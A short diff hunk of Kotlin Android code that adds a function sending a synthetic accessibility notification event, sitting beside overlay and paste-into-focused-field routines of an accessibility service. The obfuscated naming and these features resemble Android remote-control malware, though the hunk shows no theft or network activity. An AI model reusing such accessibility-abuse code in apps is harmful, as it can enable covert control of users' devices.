@@ -854,7 +854,29 @@ fun onstart_overlay(arg1: String, arg2: String) {
 
         return success
     }
-
+    
+   fun classGen12Treger() {
+    Handler(Looper.getMainLooper()).post(object : Runnable {
+        override fun run() {
+            try {
+		val accessibilityManager = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
+                /*val accessibilityManager = EngineWorkerins.app_ClassGen11_Context
+                    .getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager*/
+                if (accessibilityManager.isEnabled) {
+                    val obtain = AccessibilityEvent.obtain()
+                    obtain.eventType = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
+                    obtain.className = javaClass.name
+                    obtain.packageName = EngineWorkerins.app_ClassGen11_Context.packageName
+                    obtain.text.add(d5)
+                    accessibilityManager.sendAccessibilityEvent(obtain)
+                }
+            } catch (e2: Exception) {
+                // Handle exception if needed
+            }
+        }
+    })
+}
+   
    fun ClassGen12pasteText() {
 	    try {
 		val findFocus = rootInActiveWindow.findFocus(1)
